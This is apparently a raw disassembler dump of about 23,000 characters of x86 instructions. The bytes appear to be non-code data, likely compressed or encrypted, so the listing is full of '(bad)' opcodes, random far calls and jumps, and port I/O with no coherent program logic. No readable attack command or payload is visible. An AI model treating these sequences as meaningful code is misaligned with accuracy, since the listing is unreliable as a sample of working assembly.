  4215fa:	jbe    0x42165c
  4215fc:	mov    ebx,0x2c861c1e
  421601:	add    DWORD PTR [edi-0x1d],ebx
  421604:	xor    al,0xd2
  421606:	ret    0x21ba
  421609:	push   0x32
  42160b:	jl     0x4215e1
  42160d:	call   0x2245:0x95975dc2
  421614:	inc    edx
  421615:	add    eax,esi
  421617:	ins    DWORD PTR es:[edi],dx
  421618:	es out 0x4f,eax
  42161b:	xchg   esi,eax
  42161c:	test   DWORD PTR [edx],esp
  42161e:	div    BYTE PTR ds:0xac7616
  421624:	lds    ebx,FWORD PTR [ecx]
  421626:	inc    ebp
  421627:	cli    
  421628:	sbb    ah,dh
  42162a:	(bad)  
  42162b:	sub    esi,DWORD PTR [edx-0x32f7ac65]
  421631:	jns    0x42161b
  421633:	xor    DWORD PTR [esi-0xfdab541],esp
  421639:	add    dl,BYTE PTR ds:0x59e2a4de
  42163f:	call   0x7ebd:0xef86a4b3
  421646:	popa   
  421647:	lahf   
  421648:	add    al,0x24
  42164a:	cld    
  42164b:	xchg   DWORD PTR [ecx],ebx
  42164d:	lock (bad) 
  42164f:	popf   
  421650:	xchg   esp,eax
  421651:	ins    BYTE PTR es:[edi],dx
  421652:	dec    eax
  421653:	pop    edx
  421654:	int    0x1e
  421656:	or     eax,0xa34102c
  42165b:	push   edx
  42165c:	repnz neg edi
  42165f:	cmp    eax,0x3a00e0bc
  421664:	mov    esp,0x8650925e
  421669:	std    
  42166a:	pop    ebx
  42166b:	retf   0xc01e
  42166e:	xchg   bl,ch
  421670:	adc    ah,BYTE PTR ds:0x5da3b352
  421676:	jp     0x4216de
  421678:	xor    esi,ecx
  42167a:	shr    BYTE PTR [ebx],1
  42167c:	dec    edi
  42167d:	popf   
  42167e:	cmc    
  42167f:	in     eax,0x17
  421681:	xlat   BYTE PTR ds:[ebx]
  421682:	dec    esi
  421683:	in     al,0x94
  421685:	sub    BYTE PTR [esi],ah
  421687:	push   esp
  421688:	loope  0x42169b
  42168a:	out    dx,eax
  42168b:	js     0x42160f
  42168d:	ds jb  0x4216e3
  421690:	cmp    eax,0x9b51674e
  421695:	or     edx,DWORD PTR [ebx-0xfc12641]
  42169b:	fist   WORD PTR [ebx+0x1d]
  42169e:	shl    DWORD PTR [edx+0x18],1
  4216a1:	xor    eax,0x3fb64757
  4216a6:	fiadd  DWORD PTR [ecx+0x1b]
  4216a9:	or     BYTE PTR [ebp-0x1a3b1e3],0x42
  4216b0:	pop    ds
  4216b1:	clc    
  4216b2:	retf   0xe1bb
  4216b5:	sub    eax,0xfa6f210f
  4216ba:	dec    esp
  4216bb:	cwde   
  4216bc:	(bad)  
  4216bd:	pop    ebp
  4216be:	xchg   ebx,eax
  4216bf:	push   ecx
  4216c0:	rcr    DWORD PTR ds:0x258b6414,0x3f
  4216c7:	dec    esi
  4216c8:	mov    ecx,esi
  4216ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216cb:	push   ds
  4216cc:	retf   
  4216cd:	and    al,0x18
  4216cf:	scas   al,BYTE PTR es:[edi]
  4216d0:	xchg   ebp,eax
  4216d1:	lods   eax,DWORD PTR ds:[esi]
  4216d2:	jbe    0x421681
  4216d4:	call   0xe9d01fba
  4216d9:	fbstp  TBYTE PTR [ebx+0x2c5d11fa]
  4216df:	rcl    BYTE PTR [esi+0x4986b901],cl
  4216e5:	mov    esi,0x3724258b
  4216ea:	xchg   edx,eax
  4216eb:	fwait
  4216ec:	push   ebp
  4216ed:	pop    edi
	...
  4216fa:	and    BYTE PTR [esi],dl
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	mul    BYTE PTR [edx-0x66]
  421708:	stos   DWORD PTR es:[edi],eax
  421709:	arpl   ax,bp
  42170b:	xchg   edx,eax
  42170c:	add    DWORD PTR [eax],eax
  42170e:	cld    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    bl,bh
  421713:	sbb    eax,DWORD PTR [ebx]
  421715:	and    eax,0xce8abff9
  42171a:	popf   
  42171b:	mov    esp,0x7408bfeb
  421720:	cs cmp eax,0x4ad15451
  421726:	das    
  421727:	out    dx,eax
  421728:	adc    esp,DWORD PTR [edi+0x45]
  42172b:	jno    0x4216ce
  42172d:	bound  ebx,QWORD PTR [eax+eiz*8+0x286c7c44]
  421734:	(bad)  
  421735:	scas   eax,DWORD PTR es:[edi]
  421736:	ficom  WORD PTR [edx]
  421738:	xor    eax,0x119433e2
  42173d:	sbb    al,0x72
  42173f:	inc    esi
  421740:	push   0x4555ee98
  421745:	jge    0x421713
  421747:	mov    ebp,0xcf2430b7
  42174c:	cwde   
  42174d:	scas   al,BYTE PTR es:[edi]
  42174e:	pop    ebp
  42174f:	xchg   esi,eax
  421750:	pop    edi
  421751:	pop    esi
  421752:	mov    gs,WORD PTR [ecx+0x3d]
  421755:	inc    ecx
  421756:	sbb    DWORD PTR [ecx-0x7d],ebx
  421759:	loope  0x421726
  42175b:	es push ecx
  42175d:	or     ch,BYTE PTR [edi-0x6c0f748e]
  421763:	or     eax,DWORD PTR [ecx+0x6985c562]
  421769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42176a:	add    DWORD PTR [ebx+0x5ed8bfc1],ecx
  421770:	sahf   
  421771:	and    bh,BYTE PTR [ebx+0x53]
  421774:	mov    ah,0x87
  421776:	outs   dx,DWORD PTR ds:[esi]
  421777:	sar    BYTE PTR [ecx+edx*4+0x0],cl
  42177b:	xchg   edi,eax
  42177d:	cmp    dh,ah
  42177f:	imul   ecx,DWORD PTR [ecx+eiz*1],0x6c
  421783:	pop    esp
  421784:	pop    ds
  421785:	cmc    
  421786:	jnp    0x421723
  421788:	push   ebx
  421789:	scas   eax,DWORD PTR es:[edi]
  42178a:	pop    ss
  42178b:	mov    WORD PTR [esi-0x6c],gs
  42178e:	push   ecx
  42178f:	pop    esp
  421790:	sbb    DWORD PTR [esi-0x9],esi
  421793:	adc    BYTE PTR [edi+eax*8-0x79],dh
  421797:	xchg   edi,eax
  421798:	test   ebx,edi
  42179a:	(bad)  
  42179b:	or     cl,al
  42179d:	stos   DWORD PTR es:[edi],eax
  42179e:	xchg   edx,eax
  42179f:	adc    dl,BYTE PTR [ebx]
  4217a1:	test   DWORD PTR ds:0xeef71616,esi
  4217a7:	pop    ecx
  4217a8:	cmp    edi,DWORD PTR [ecx+0x64547a58]
  4217ae:	mov    bh,0xc7
  4217b0:	jo     0x421749
  4217b2:	sbb    dl,BYTE PTR [edx+0x4c]
  4217b5:	sbb    ax,0xbf4b
  4217b9:	(bad)  
  4217ba:	ds mov ecx,0x1d391795
  4217c0:	nop
  4217c1:	push   esp
  4217c2:	cdq    
  4217c3:	fcomp  DWORD PTR [esi]
  4217c5:	mov    eax,DWORD PTR [eax-0x5b116e06]
  4217cb:	imul   esi,edi,0x1a59d96b
  4217d1:	fst    DWORD PTR [edx-0x6c]
  4217d4:	mov    ds:0x83e4a5cf,al
  4217d9:	xor    bl,cl
  4217db:	mov    ch,0x12
  4217dd:	ss scas eax,DWORD PTR es:[edi]
  4217df:	jecxz  0x421854
  4217e1:	shl    DWORD PTR [eax],1
  4217e3:	inc    esp
  4217e4:	pop    ds
  4217e5:	and    DWORD PTR [esi+0x7a],ecx
  4217e8:	adc    eax,0x8891ddcb
  4217ed:	sub    eax,0xafc4877b
  4217f2:	sbb    BYTE PTR [ebp-0x37],bh
  4217f5:	pop    ss
  4217f6:	or     BYTE PTR [ecx],ah
  4217f8:	mul    BYTE PTR [esi-0x5519a3e9]
  4217fe:	push   edi
  4217ff:	inc    ebp
  421800:	loope  0x421826
  421802:	push   ds
  421803:	icebp  
  421804:	push   es
  421805:	xor    DWORD PTR [eax+0x29908b9d],0xffffffcf
  42180c:	in     eax,0xba
  42180e:	pop    ecx
  42180f:	push   ebp
  421810:	rcr    BYTE PTR [eax-0x23fd2db9],cl
  421816:	adc    DWORD PTR [esi],edi
  421818:	xchg   ebp,eax
  421819:	ds push ds
  42181b:	retf   
  42181c:	cdq    
  42181d:	jge    0x421818
  42181f:	xlat   BYTE PTR ds:[ebx]
  421820:	pop    edx
  421821:	call   0x638:0x650bcb1c
  421828:	nop
  421829:	sahf   
  42182a:	(bad)  
  42182b:	shl    cl,0x1d
  42182e:	add    al,0x29
  421830:	dec    edi
  421831:	adc    al,0xaa
  421833:	call   DWORD PTR [edi+0x2dbf1df2]
  421839:	js     0x421892
  42183b:	scas   al,BYTE PTR es:[edi]
  42183c:	cmp    BYTE PTR [ebx],al
  42183e:	dec    eax
  42183f:	cmp    al,0xed
  421841:	cmp    DWORD PTR [eax],esp
  421843:	iret   
  421844:	dec    eax
  421845:	mov    esi,0xc54dc647
  42184a:	and    al,0x56
  42184c:	xchg   BYTE PTR [esi+0x5274001],dh
  421852:	retf   
  421853:	mov    dh,0xb7
  421855:	cs adc al,0xf7
  421858:	mov    eax,ds:0xc320f6d8
  42185d:	je     0x42180a
  42185f:	push   0x827cf0ef
  421864:	mov    bh,0xd4
  421866:	dec    ebx
  421867:	xchg   edx,eax
  421868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421869:	mov    ds:0xe72e9c17,al
  42186e:	dec    edi
  42186f:	stos   DWORD PTR es:[edi],eax
  421870:	out    0xee,al
  421872:	adc    DWORD PTR [esi],esi
  421874:	mov    ch,0xbb
  421876:	std    
  421877:	cmp    al,0xa1
  421879:	mov    DWORD PTR [ecx+0x2a],0x19d5c112
  421880:	add    BYTE PTR [ebx-0x797f09be],dl
  421886:	mov    ch,0x77
  421888:	mov    ebp,0x32e982cb
  42188d:	jae    0x42184c
  42188f:	sub    eax,eax
  421891:	fcomp  QWORD PTR [ebp-0x69f609a]
  421897:	inc    esi
  421898:	sbb    DWORD PTR [ebp+0x7445c86],esp
  42189e:	xchg   ebx,eax
  42189f:	jmp    0xacc964f3
  4218a4:	iret   
  4218a5:	adc    edi,DWORD PTR [ebx+0x9ab68b1]
  4218ab:	adc    al,0x52
  4218ad:	mov    WORD PTR [ebp+edi*8+0x6b],es
  4218b1:	mov    eax,ds:0x6a9ab144
  4218b6:	inc    edi
  4218b8:	test   BYTE PTR [ebp+0x59],ah
  4218bb:	jecxz  0x42183f
  4218bd:	cmp    DWORD PTR [edi],esp
  4218bf:	popa   
  4218c0:	push   ds
  4218c1:	out    0x3e,al
  4218c3:	out    dx,eax
  4218c4:	iret   
  4218c5:	add    edx,DWORD PTR [ebx+ebp*2+0x1]
  4218c9:	xchg   esp,eax
  4218ca:	jno    0x4218f3
  4218cc:	pop    ebx
  4218cd:	sbb    al,0xc2
  4218cf:	add    BYTE PTR [ebx],ch
  4218d1:	jl     0x42188c
  4218d3:	out    0x98,al
  4218d5:	push   0x5ee55d70
  4218da:	stos   BYTE PTR es:[edi],al
  4218db:	mov    ds:0xdee42ef4,al
  4218e0:	js     0x421954
  4218e2:	jo     0x4218c4
  4218e4:	stos   BYTE PTR es:[edi],al
  4218e5:	adc    BYTE PTR [ecx+0x7e12654],al
  4218eb:	sbb    DWORD PTR [ecx+0x44d7f8fc],esp
  4218f1:	jmp    0xb5d1:0xa181db9c
  4218f8:	jmp    0x42187f
  4218fa:	loop   0x42187c
  4218fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218fd:	xchg   ebp,eax
  4218fe:	outs   dx,BYTE PTR ds:[esi]
  4218ff:	or     ch,bh
  421901:	mov    al,ds:0x95bb7207
  421906:	imul   edi,edi,0x57ccaf53
  42190c:	loop   0x42193b
	...
  42191a:	mov    al,0x33
  42191c:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  421922:	pop    DWORD PTR [edx-0x44]
  421925:	mov    dh,BYTE PTR ds:0xe4edfb72
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	cld    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [edx],ah
  421933:	aas    
  421934:	call   0x8bbd:0xc4828e47
  42193b:	push   es
  42193c:	out    0xc,al
  42193e:	push   ss
  42193f:	retf   0x23c0
  421942:	jmp    0x75511ac8
  421947:	inc    edx
  421948:	cmp    al,0x3b
  42194a:	and    bl,0x83
  42194d:	loopne 0x421993
  42194f:	test   DWORD PTR [edi+0x4f],0xfb785d38
  421956:	mov    ds:0x11bd4f09,eax
  42195b:	sub    DWORD PTR [ecx-0xd7a69bf],edi
  421961:	push   esp
  421962:	jbe    0x421904
  421964:	jl     0x4219c7
  421966:	fistp  QWORD PTR [ebp-0x7b]
  421969:	push   0xffffffa3
  42196b:	shl    al,0x90
  42196e:	cs mov ecx,0x11c7a1dd
  421974:	pushf  
  421975:	and    ch,BYTE PTR [edx+0x24]
  421978:	inc    ebp
  421979:	retf   0xf095
  42197c:	jmp    0xdb665dc3
  421981:	sbb    al,0x6d
  421983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421984:	ficom  WORD PTR [eax+0x3f]
  421987:	int3   
  421988:	push   ebx
  421989:	scas   eax,DWORD PTR es:[edi]
  42198a:	lds    esp,FWORD PTR [edx+0x12]
  42198d:	sahf   
  42198e:	and    ecx,DWORD PTR [edi+0x2a]
  421991:	call   0x2f620560
  421996:	pop    esp
  421997:	sbb    al,0x6c
  421999:	neg    BYTE PTR [ecx]
  42199b:	xor    DWORD PTR [eax+esi*4+0x72],edx
  42199f:	pop    edi
  4219a0:	int    0x4f
  4219a2:	pop    es
  4219a3:	xor    edi,DWORD PTR [ecx]
  4219a5:	aas    
  4219a6:	arpl   WORD PTR [edx],bp
  4219a8:	cdq    
  4219a9:	mov    fs,WORD PTR [eax+0x13]
  4219ac:	ficomp DWORD PTR [edi-0x1b]
  4219af:	dec    edx
  4219b0:	xor    ebp,DWORD PTR [ebx+0x6d]
  4219b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219b4:	repnz fiadd DWORD PTR ds:0xcd0b7ecf
  4219bb:	mov    ch,0x6
  4219bd:	mov    ds:0xcf5492f4,al
  4219c2:	in     al,dx
  4219c3:	rcr    DWORD PTR ds:0x26bba441,0x18
  4219ca:	jp     0x42198a
  4219cc:	push   edx
  4219cd:	aad    0x64
  4219cf:	(bad)  
  4219d0:	push   ecx
  4219d1:	fild   DWORD PTR es:[esi-0x7633c7f7]
  4219d8:	push   edi
  4219d9:	ficom  DWORD PTR [eax]
  4219db:	sub    edi,eax
  4219dd:	xor    eax,0xfc86cd40
  4219e2:	out    dx,al
  4219e3:	pop    eax
  4219e4:	sbb    DWORD PTR [edx+0x3d58b0a4],ebp
  4219ea:	xlat   BYTE PTR ds:[ebx]
  4219eb:	mov    al,0xc
  4219ed:	and    al,0xa5
  4219ef:	aaa    
  4219f0:	imul   ebp,DWORD PTR [eax+0x1],0x33
  4219f4:	xchg   ebx,eax
  4219f5:	mov    ch,0x1f
  4219f7:	push   ebp
  4219f8:	call   0xff96eafe
  4219fd:	xor    DWORD PTR [edi-0x48],ebp
  421a00:	jo     0x421a5e
  421a02:	lds    edi,FWORD PTR [eax+0x76e29d19]
  421a08:	ds push eax
  421a0a:	ds push edx
  421a0c:	xchg   esp,eax
  421a0d:	ins    BYTE PTR es:[edi],dx
  421a0e:	leave  
  421a0f:	cmp    BYTE PTR [edi],ch
  421a11:	xchg   BYTE PTR [ecx+0x11],ah
  421a14:	std    
  421a15:	xchg   edx,eax
  421a16:	jle    0x421a29
  421a18:	rcl    BYTE PTR [ecx-0x2eac918a],1
  421a1e:	(bad)  
  421a1f:	mov    dh,0x21
  421a21:	push   ecx
  421a22:	jmp    0x4219f9
  421a24:	mov    gs,WORD PTR [esi+0x3d83b567]
  421a2a:	ret    
  421a2b:	test   DWORD PTR [ebx-0xa33d4a],ebx
  421a31:	daa    
  421a32:	(bad)
  421a35:	push   esi
  421a36:	jnp    0x421a37
  421a38:	inc    ebp
  421a39:	into   
  421a3a:	adc    ecx,DWORD PTR [ecx+0x71]
  421a3d:	sbb    DWORD PTR [edx+0x1c],esi
  421a40:	fs into 
  421a42:	sti    
  421a43:	pop    ss
  421a44:	push   ds
  421a45:	mov    bl,dl
  421a47:	push   ebx
  421a48:	sbb    edx,DWORD PTR [esp+edi*4-0x70]
  421a4c:	xchg   ebx,eax
  421a4d:	lahf   
  421a4e:	outs   dx,DWORD PTR ds:[esi]
  421a4f:	scas   eax,DWORD PTR es:[edi]
  421a50:	stos   DWORD PTR es:[edi],eax
  421a51:	mov    esi,0x5092cd9a
  421a56:	fs loopne 0x421a5c
  421a59:	sub    ah,BYTE PTR [eax+ecx*8+0x28]
  421a5d:	das    
  421a5e:	lods   al,BYTE PTR ds:[esi]
  421a5f:	mov    dl,BYTE PTR [edx-0x9]
  421a62:	mov    cl,0x5
  421a64:	inc    esi
  421a65:	fdivr  QWORD PTR [ebx+0x6a]
  421a68:	in     eax,0x19
  421a6a:	clc    
  421a6b:	(bad)  
  421a6c:	scas   eax,DWORD PTR es:[edi]
  421a6d:	and    eax,DWORD PTR [ebp-0x2e0361be]
  421a73:	xor    eax,0xe4e763f6
  421a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a79:	or     cl,BYTE PTR [ecx]
  421a7b:	int3   
  421a7c:	cld    
  421a7d:	add    ah,BYTE PTR [esp+ebp*4-0x6688de90]
  421a84:	and    eax,0x4bd8b9d8
  421a89:	clc    
  421a8a:	dec    esi
  421a8b:	jp     0x421a99
  421a8d:	jae    0x421a4b
  421a8f:	adc    ah,BYTE PTR es:[ebp+0x41]
  421a93:	and    cl,BYTE PTR [edi+edi*4-0x7d4fe54f]
  421a9a:	mov    ah,0xa2
  421a9c:	push   ebp
  421a9d:	or     esi,ebp
  421a9f:	ins    BYTE PTR es:[edi],dx
  421aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aa1:	popf   
  421aa2:	pop    eax
  421aa3:	into   
  421aa4:	adc    al,0xaa
  421aa6:	adc    BYTE PTR [edi+0x51],ch
  421aa9:	dec    esp
  421aaa:	fild   DWORD PTR [edi]
  421aac:	adc    al,0xe6
  421aae:	mov    al,ds:0x6b47554f
  421ab3:	push   ss
  421ab4:	idiv   BYTE PTR [esi+0x3b]
  421ab7:	mov    edi,0x55bfc886
  421abc:	xchg   esp,eax
  421abd:	add    eax,DWORD PTR [ebp+0x5f]
  421ac0:	ja     0x421ac7
  421ac2:	mov    al,ds:0x7f91180a
  421ac7:	inc    ebp
  421ac8:	add    eax,0xa8d8e6d6
  421acd:	xchg   edx,eax
  421ace:	div    edi
  421ad0:	and    ah,al
  421ad2:	or     al,0xca
  421ad4:	pop    edi
  421ad5:	sub    BYTE PTR [eax-0x28],cl
  421ad8:	hlt    
  421ad9:	rcl    BYTE PTR [edx+0x66d9897e],0xa6
  421ae0:	adc    DWORD PTR [edi-0x4a],0xa771af28
  421ae7:	cmc    
  421ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ae9:	add    BYTE PTR [edx-0x62c8332d],dh
  421aef:	push   ss
  421af0:	inc    edx
  421af1:	dec    ebx
  421af2:	xlat   BYTE PTR ds:[ebx]
  421af3:	test   DWORD PTR [eax],esi
  421af5:	push   0xffffffd4
  421af7:	jmp    0x421afe
  421af9:	dec    edi
  421afa:	mov    eax,ds:0xf1ebfc5a
  421aff:	xchg   ebp,eax
  421b00:	out    dx,al
  421b01:	test   esi,esp
  421b03:	jae    0x421ae6
  421b05:	pop    ss
  421b06:	mov    eax,0x7cf12315
  421b0b:	dec    ebx
  421b0c:	in     al,0x94
  421b0e:	ror    DWORD PTR [edx+esi*4-0x99709d3],0x1d
  421b16:	xor    eax,0xe69147e2
  421b1b:	adc    al,0x39
  421b1d:	xor    DWORD PTR [ebx+0x46],eax
  421b20:	cli    
  421b21:	jmp    0xcb83:0x1e46b248
  421b28:	sbb    esp,edi
  421b2a:	stos   DWORD PTR es:[edi],eax
  421b2b:	dec    ebx
  421b2c:	pusha  
  421b2d:	sub    al,BYTE PTR [eax]
	...
  421b37:	add    BYTE PTR [eax],al
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0x4c45f8f7
  421b48:	add    al,0xd6
  421b4a:	loopne 0x421ae2
  421b4c:	add    DWORD PTR [eax],eax
  421b4e:	cld    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    dl,bl
  421b53:	es mov al,0xd8
  421b56:	or     al,0xa9
  421b58:	jbe    0x421b3d
  421b5a:	pop    esi
  421b5b:	ja     0x421b95
  421b5d:	dec    ebx
  421b5e:	xchg   edi,eax
  421b5f:	push   es
  421b60:	push   ebx
  421b61:	rol    edi,cl
  421b63:	mov    cl,0xc8
  421b65:	mov    ebx,0xd92664ea
  421b6a:	hlt    
  421b6b:	rcl    DWORD PTR [edx+0x7e],0xcf
  421b6f:	mov    DWORD PTR [eax-0x13c53ee9],eax
  421b75:	or     ebx,ecx
  421b77:	sbb    al,BYTE PTR [ebp*8+0x72df5b85]
  421b7e:	and    al,0x67
  421b80:	sbb    ebx,ebx
  421b82:	pop    es
  421b83:	outs   dx,BYTE PTR ds:[esi]
  421b84:	xor    ebp,0x754fc7a8
  421b8a:	cmp    BYTE PTR [edi],0xe8
  421b8d:	ret    0xa4a9
  421b90:	bound  edi,QWORD PTR [edi-0x71]
  421b93:	xchg   esp,eax
  421b94:	mov    ah,BYTE PTR [edx-0x185a8a7d]
  421b9a:	and    DWORD PTR [ebp+0x5d76cce5],eax
  421ba0:	adc    al,BYTE PTR [ebx+0x12]
  421ba3:	or     ebp,DWORD PTR [edx]
  421ba5:	ror    DWORD PTR [edi+0x23ec0f2],0x92
  421bac:	mov    esp,0x7989866d
  421bb1:	pop    ebx
  421bb2:	or     eax,0x5f48fd1d
  421bb7:	cmc    
  421bb8:	pop    esi
  421bb9:	and    al,BYTE PTR [ebp-0x67]
  421bbc:	sti    
  421bbd:	lea    ebx,[ecx-0xbf74f38]
  421bc3:	dec    edx
  421bc4:	pop    ds
  421bc5:	inc    ebp
  421bc6:	imul   ecx,DWORD PTR [edx+0x73832b3a],0x1e
  421bcd:	aam    0x8
  421bcf:	aas    
  421bd0:	packssdw mm4,QWORD PTR [esi-0x1b3f1532]
  421bd7:	jmp    0x2897ffe9
  421bdc:	xchg   ebp,eax
  421bdd:	out    dx,eax
  421bde:	rcl    DWORD PTR [ebx],cl
  421be0:	mov    ebp,DWORD PTR [edi+edi*2+0x5b]
  421be4:	(bad)  
  421be5:	and    ax,0x6bf1
  421be9:	mov    al,ds:0x29a1cb50
  421bee:	xor    cl,dl
  421bf0:	pop    es
  421bf1:	push   eax
  421bf2:	mul    BYTE PTR [ecx-0x3c]
  421bf5:	xchg   BYTE PTR [edi+0x3],ch
  421bf8:	loop   0x421b86
  421bfa:	imul   edx,DWORD PTR [ebx-0xd],0x2c9b2a8e
  421c01:	sahf   
  421c02:	mov    ecx,ss
  421c04:	jne    0x421c08
  421c06:	popf   
  421c07:	and    DWORD PTR [edi+ecx*1],edi
  421c0a:	(bad)  
  421c0c:	inc    ebx
  421c0d:	inc    eax
  421c0e:	scas   eax,DWORD PTR es:[edi]
  421c0f:	jge    0x421b99
  421c11:	loope  0x421c3c
  421c13:	out    0xc7,eax
  421c15:	inc    ebx
  421c16:	adc    BYTE PTR [edx+eax*4+0x2d],dl
  421c1a:	dec    ecx
  421c1b:	adc    DWORD PTR [ecx],esi
  421c1d:	mov    DWORD PTR [ebp-0x9],esp
  421c20:	neg    BYTE PTR [ecx+esi*8-0x48]
  421c24:	std    
  421c25:	or     ecx,DWORD PTR [eax+0x56]
  421c28:	or     ecx,DWORD PTR [ebx-0x6e]
  421c2b:	add    ebx,ebp
  421c2d:	jns    0x421bfc
  421c2f:	mov    DWORD PTR [esi],edi
  421c31:	emms   
  421c33:	adc    al,0x49
  421c35:	test   BYTE PTR [esi+esi*8+0x4f073b27],dl
  421c3c:	test   DWORD PTR [esi+0x70],0xced73552
  421c43:	dec    edi
  421c44:	rcl    ebx,cl
  421c46:	inc    ebx
  421c47:	cld    
  421c48:	test   eax,0x7f5202e5
  421c4d:	pop    esi
  421c4e:	sbb    eax,0x98a1187
  421c53:	add    BYTE PTR [ecx],bl
  421c55:	retf   
  421c56:	push   ecx
  421c57:	inc    ecx
  421c58:	aaa    
  421c59:	das    
  421c5a:	mov    ds:0xd4fff4d6,eax
  421c5f:	repz loope 0x421c69
  421c62:	pop    ss
  421c63:	clc    
  421c64:	mov    ch,0xde
  421c66:	adc    eax,0xef011322
  421c6b:	pop    edi
  421c6c:	popf   
  421c6d:	mov    dh,0x26
  421c6f:	fcom   DWORD PTR [ecx+0x18c1e44a]
  421c75:	push   ecx
  421c76:	mov    dl,0x14
  421c78:	inc    eax
  421c79:	xchg   esp,eax
  421c7a:	rol    ebx,cl
  421c7c:	jmp    0x421c27
  421c7e:	xor    al,0x9b
  421c80:	cmp    DWORD PTR [eax],0xffffffc4
  421c83:	mov    esi,0x52ebf7e9
  421c88:	scas   al,BYTE PTR es:[edi]
  421c89:	ja     0x421c76
  421c8b:	xchg   esp,eax
  421c8c:	push   ebp
  421c8d:	xor    al,0x32
  421c8f:	mov    esi,0xda6c290e
  421c94:	gs inc ebp
  421c96:	lods   al,BYTE PTR ds:[esi]
  421c97:	mov    al,ds:0xc6c4ad22
  421c9c:	xchg   edi,eax
  421c9d:	pushf  
  421c9e:	in     eax,dx
  421c9f:	sahf   
  421ca0:	repz dec edx
  421ca2:	retf   0x5df0
  421ca5:	sub    ebx,DWORD PTR [eax-0x79]
  421ca8:	mov    ds:0x66ac5c12,eax
  421cad:	repz (bad) 
  421caf:	lods   eax,DWORD PTR ds:[esi]
  421cb0:	pop    edx
  421cb1:	lock fcmovnu st,st(0)
  421cb4:	jecxz  0x421d0b
  421cb6:	ss ret 
  421cb8:	adc    esi,0x78083e19
  421cbe:	xchg   BYTE PTR [esi+0x5adc983c],dl
  421cc4:	mov    DWORD PTR [eax+ebx*8],esp
  421cc7:	sub    al,0x90
  421cc9:	jnp    0x421cf1
  421ccb:	es xchg ebx,eax
  421ccd:	leave  
  421cce:	sub    bl,dl
  421cd0:	in     eax,0x51
  421cd2:	cmp    BYTE PTR [ebx],bl
  421cd4:	in     eax,dx
  421cd5:	cmp    ch,BYTE PTR [edx-0x6a]
  421cd8:	sbb    DWORD PTR [esi],ebp
  421cda:	cli    
  421cdb:	add    al,0x72
  421cdd:	ret    
  421cde:	dec    eax
  421cdf:	and    al,0x25
  421ce1:	mov    esp,0x82188962
  421ce6:	push   ebp
  421ce7:	adc    eax,0xc2df3d9a
  421cec:	test   DWORD PTR [esi+edi*4-0x2dc2f925],edi
  421cf3:	xchg   ebp,eax
  421cf4:	pop    esp
  421cf5:	cmp    ch,dl
  421cf7:	jmp    0x421c94
  421cf9:	sub    al,0xf4
  421cfb:	mov    ecx,0xbc6bf266
  421d00:	dec    ebp
  421d01:	aas    
  421d02:	sub    eax,0x31c70833
  421d07:	and    al,0x72
  421d09:	inc    ebp
  421d0a:	jae    0x421cbe
  421d0c:	xlat   BYTE PTR ds:[ebx]
  421d0d:	inc    edx
  421d0e:	(bad)  
  421d0f:	daa    
  421d10:	test   DWORD PTR [esi+ecx*4+0x23],esi
  421d14:	dec    eax
  421d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d16:	xchg   ebp,eax
  421d17:	popf   
  421d18:	enter  0xa1c6,0x3b
  421d1c:	daa    
  421d1d:	inc    ebx
  421d1e:	or     DWORD PTR [ecx+ebx*1],ebp
  421d21:	test   DWORD PTR [ebx+ebp*8-0x22d6693e],edx
  421d28:	mov    ah,0x1e
  421d2a:	frstor [eax]
  421d2c:	xlat   BYTE PTR ds:[ebx]
  421d2d:	push   edi
  421d2e:	adc    ch,0xe5
  421d31:	test   eax,0x4e0365ff
  421d36:	dec    eax
  421d37:	mov    WORD PTR [edi+0x4b],cs
  421d3a:	(bad)  
  421d3b:	sbb    cl,dl
  421d3d:	lahf   
  421d3e:	shr    BYTE PTR [ecx+0x3a],cl
  421d41:	sbb    edx,DWORD PTR [ebx]
  421d43:	or     DWORD PTR [edx+0x10],eax
  421d46:	jg     0x421d6e
  421d48:	mov    esi,0x3372e8f4
  421d4d:	retf   0x0
	...
  421d58:	add    BYTE PTR [eax],al
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	xchg   esi,eax
  421d67:	sbb    eax,0x98dc8e8f
  421d6c:	add    DWORD PTR [eax],eax
  421d6e:	cld    
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [eax],dl
  421d73:	jbe    0x421d4b
  421d75:	lock jno 0x421d80
  421d78:	(bad)  [esi]
  421d7a:	jae    0x421dfb
  421d7c:	into   
  421d7d:	fs jne 0x421d58
  421d80:	(bad)  
  421d81:	aam    0xec
  421d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d84:	xchg   ebp,eax
  421d85:	jb     0x421d6b
  421d87:	sub    eax,0x8893259d
  421d8c:	ret    
  421d8d:	xchg   ecx,eax
  421d8e:	dec    esi
  421d8f:	sbb    ah,dl
  421d91:	call   0x345959a
  421d96:	sbb    DWORD PTR ds:0x15653a0e,edx
  421d9c:	and    al,ah
  421d9e:	jl     0x421d41
  421da0:	pop    ss
  421da1:	pop    ds
  421da2:	fistp  WORD PTR [edx]
  421da4:	xchg   ecx,eax
  421da5:	sbb    ch,ch
  421da7:	out    0x4c,al
  421da9:	push   ds
  421daa:	loope  0x421de0
